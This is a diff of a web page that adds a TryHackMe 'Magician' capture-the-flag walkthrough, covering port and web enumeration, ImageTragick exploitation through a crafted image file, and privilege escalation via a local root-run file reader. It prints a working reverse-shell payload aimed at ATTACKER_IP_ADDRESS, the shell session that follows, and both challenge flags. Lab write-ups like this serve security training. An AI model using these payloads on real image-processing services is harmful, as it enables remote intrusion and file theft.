@@ -23,7 +23,7 @@
     
     
       
-        <title>Summary write ups (easy difficulty) - Offense, Defense, and Everything Between</title>
+        <title>Magician - Offense, Defense, and Everything Between</title>
       
     
     
@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#magician" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Summary write ups (easy difficulty)
+              Magician
             
           </span>
         </div>
@@ -607,6 +612,149 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration-port-8080" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration (port 8080)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration-port-8081" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP enumeration (port 8081)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        POC
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -621,32 +769,314 @@
                 
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:system-misconfiguration" class="md-tag">system-misconfiguration</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:vulnerability-exploitation" class="md-tag">vulnerability-exploitation</a>
+      
+    
+  </nav>
 
 
-  <h1>Summary write ups (easy difficulty)</h1>
 
+<h1 id="magician">Magician</h1>
+<p><img alt="Magician logo" src="../logos/magician_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/magician">Magician</a>  </p>
+<h2 id="description">Description</h2>
+<p>"This magical website lets you convert image file formats</p>
+<p>Please add the IP address of this machine with the hostname "magician" to your /etc/hosts file on Linux before you start.
+On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.</p>
+<p>Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)</p>
+<p>Have fun and use your magic skills!"</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+nmap -p$ports -A -T4 TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.020s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+8080/tcp open  http    Apache Tomcat (language: en)
+|_http-title: Site doesn&#39;t have a title (application/json).
+8081/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: magician
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
+Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 5.4 - 5.15 (96%), Linux 4.15 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<div class="highlight"><pre><span></span><code>ftp 10.130.160.89                                                                                                                           
+Connected to 10.130.160.89.
+220 THE MAGIC DOOR
+Name (10.130.160.89:kali): ftp # Same result with &quot;anonymous&quot; login
+331 Please specify the password.
+Password: 
+230-Huh? The door just opens after some time? You&#39;re quite the patient one, aren&#39;t ya, it&#39;s a thing called &#39;delay_successful_login&#39; in /etc/vsftpd.conf ;) Since you&#39;re a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
+230 Login successful.
+ftp&gt; dir
+550 Permission denied.
+</code></pre></div>
+<h3 id="http-enumeration-port-8080">HTTP Enumeration (port 8080)</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u http://TARGET_IP_ADDRESS:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
 <ul>
-<li><a href="../brooklyn_nine_nine/">Brooklyn Nine Nine</a>  </li>
-<li><a href="../smag_grotto/">Smag Grotto</a>  </li>
-<li><a href="../bounty_hunter/">Bounty Hunter</a>  </li>
-<li><a href="../easy_peasy/">Easy Peasy</a></li>
-<li><a href="../gamingserver/">GamingServer</a></li>
-<li><a href="../rootme/">RootMe</a></li>
-<li><a href="../poster/">Poster</a></li>
-<li><a href="../brute_it/">Brute It</a></li>
-<li><a href="../startup/">Startup</a></li>
-<li><a href="../chill_hack/">Chill Hack</a></li>
-<li><a href="../cyborg/">Cyborg</a></li>
-<li><a href="../archangel/">Archangel</a></li>
-<li><a href="../magician/">Magician</a></li>
-<li><a href="../jpgchat/">JPGChat</a></li>
+<li>Navigating to web page in a browser results in a "secure connection failed" message  </li>
+<li>Using hostname provided ("magician") with specified port results in a <code>404</code> error  </li>
+<li>No <code>robots.txt</code> or <code>sitemap</code> files  </li>
+<li><code>ffuf</code> scan reveals two directories of interest: <code>/files</code> and <code>/upload</code>  </li>
+<li><code>/files</code> page results in an empty page being returned in raw data  </li>
+<li><code>/upload</code> page results in a <code>405</code> error  </li>
 </ul>
+<h3 id="http-enumeration-port-8081">HTTP enumeration (port 8081)</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS:8081/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u http://TARGET_IP_ADDRESS:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li>Navigating to web page in a browser results in a "secure connection failed" message  </li>
+<li>Using hostname provided ("magician") with specified port reveals a PNG to JPG converter portal  </li>
+<li>No <code>robots.txt</code> or <code>sitemap</code> files  </li>
+<li>Nothing interesting in source code  </li>
+<li><code>ffuf</code> scan reveals <code>/img</code>, <code>/css</code>, and <code>/js</code> directories - all result in a <code>403</code> error</li>
+</ul>
+<h3 id="vulnerability-enumeration">Vulnerability Enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit vsftpd 2.0.8   # No results
+searchsploit nginx 1.14.0   # No results
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<p><a href="https://imagetragick.com/">ImageTragick</a> (this provided by FTP enumeration)</p>
+<h3 id="poc">POC</h3>
+<div class="highlight"><pre><span></span><code>nano poc.png
+
+# File contents
+push graphic-context
+viewbox 0 0 640 480
+fill &#39;url(http://ATTACKER_IP_ADDRESS:8000/test.txt)&#39;
+pop graphic-context
+
+touch test.txt
+python3 -m http.server
+
+# Upload poc.png to web server and convert
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li>Web server on attacker machine shows successful connection to <code>GET</code> "test.txt"<br />
+<em>Exploit viability confirmed</em></li>
+</ul>
+<h3 id="exploitation">Exploitation</h3>
+<p><a href="https://techbrunch.github.io/patt-mkdocs/Upload%20Insecure%20Files/Picture%20Image%20Magik/">ImageTragick payloads</a>
+<div class="highlight"><pre><span></span><code>nano exploit.png
+
+# File contents
+push graphic-context
+encoding &quot;UTF-8&quot;
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 &#39;|/bin/sh -i &gt; /dev/tcp/ATTACKER_IP_ADDRESS/4444 0&lt;&amp;1 2&gt;&amp;1&#39;
+pop graphic-context
+pop graphic-context
+
+nc -lvnp 4444
+
+# Upload exploit.png to web server and convert
+
+Listening on 0.0.0.0 4444
+Connection received on 10.130.160.89 44756
+sh: cannot set terminal process group (1495): Inappropriate ioctl for device
+sh: no job control in this shell
+
+sh-4.4$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+
+magician@magician:/tmp/hsperfdata_magician$ ls -al /home
+total 12
+drwxr-xr-x  3 root     root     4096 Jan 30  2021 .
+drwxr-xr-x 24 root     root     4096 Jan 30  2021 ..
+drwxr-xr-x  5 magician magician 4096 Feb 13  2021 magician
+
+magician@magician:/tmp/hsperfdata_magician$ ls -al /home/magician
+total 17204
+drwxr-xr-x 5 magician magician     4096 Feb 13  2021 .
+drwxr-xr-x 3 root     root         4096 Jan 30  2021 ..
+lrwxrwxrwx 1 magician magician        9 Feb  6  2021 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 magician magician      220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 magician magician     3771 Apr  4  2018 .bashrc
+drwx------ 2 magician magician     4096 Jan 30  2021 .cache
+drwx------ 3 magician magician     4096 Jan 30  2021 .gnupg
+-rw-r--r-- 1 magician magician      807 Apr  4  2018 .profile
+-rw-r--r-- 1 magician magician        0 Jan 30  2021 .sudo_as_admin_successful
+-rw------- 1 magician magician     7546 Jan 31  2021 .viminfo
+-rw-r--r-- 1 root     root     17565546 Jan 30  2021 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
+-rw-r--r-- 1 magician magician      170 Feb 13  2021 the_magic_continues
+drwxr-xr-x 2 root     root         4096 Feb  5  2021 uploads
+-rw-r--r-- 1 magician magician       24 Jan 30  2021 user.txt
+
+magician@magician:/tmp/hsperfdata_magician$ cat /home/magician/user.txt
+</code></pre></div></p>
+<details class="success">
+<summary>user.txt</summary>
+<p>THM{simsalabim_hex_hex}</p>
+</details>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><div class="highlight"><pre><span></span><code>magician@magician:/tmp/hsperfdata_magician$ cat /home/magician/the_magic_continues
+The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
+
+magician@magician:/tmp/hsperfdata_magician$
+root      1070  0.0  1.9  65232 19556 ?        Ss   08:22   0:00 /usr/bin/python3 /usr/local/bin/gunicorn --bind 127.0.0.1:6666 magiccat:app
+root      2122  0.0  2.9  83920 28916 ?        S    09:52   0:00 /usr/bin/python3 /usr/local/bin/gunicorn --bind 127.0.0.1:6666 magiccat:app
+magician  3187  0.0  0.1  13220  1100 pts/1    S+   10:19   0:00 grep --color=auto cat
+
+magician@magician:/tmp/hsperfdata_magician$ curl http://localhost:6666
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;The Magic cat&lt;/title&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;!-- Bootstrap --&gt;
+    &lt;link href=&quot;//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+
+&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;navbar-header&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;The Magic cat&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;container&quot;&gt;
+
+
+&lt;form action=&quot;&quot; method=&quot;post&quot;
+  class=&quot;form&quot; role=&quot;form&quot;&gt;
 
 
 
 
 
 
+
+&lt;div class=&quot;form-group &quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;filename&quot;&gt;Enter filename&lt;/label&gt;
+
+          &lt;input class=&quot;form-control&quot; id=&quot;filename&quot; name=&quot;filename&quot; type=&quot;text&quot; value=&quot;&quot;&gt;
+
+  &lt;/div&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    &lt;input class=&quot;btn btn-default&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+
+
+
+
+
+
+&lt;/form&gt;
+&lt;div&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>magician@magician:/tmp/hsperfdata_magician$ curl -H &quot;Content-type: application/x-www-form-urlencoded&quot; -d &quot;filename=/root/root.txt&quot; -X POST http://localhost:6666
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>&lt;REDACTED FOR BREVITY&gt;
+&lt;/form&gt;
+&lt;div&gt;
+    &lt;span&gt;
+        &lt;pre class=&quot;page-header&quot;&gt;
+        GUZ{zntvp_znl_znxr_znal_zra_znq}
+
+
+        &lt;/pre&gt;
+    &lt;/span&gt;
+&lt;/div&gt;
+</code></pre></div></p>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Use CyberChef ROT13 Brute Force recipe to convert returned filed contents  </p>
+<details class="success">
+<summary>root.txt</summary>
+<p>THM{magic_may_make_many_men_mad}</p>
+</details>
+<p><strong>Date completed:</strong> 16/05/26<br />
+<strong>Date published:</strong> 16/05/26</p>
+
+
+
+
+
+
+
+  
+  
 
 
 
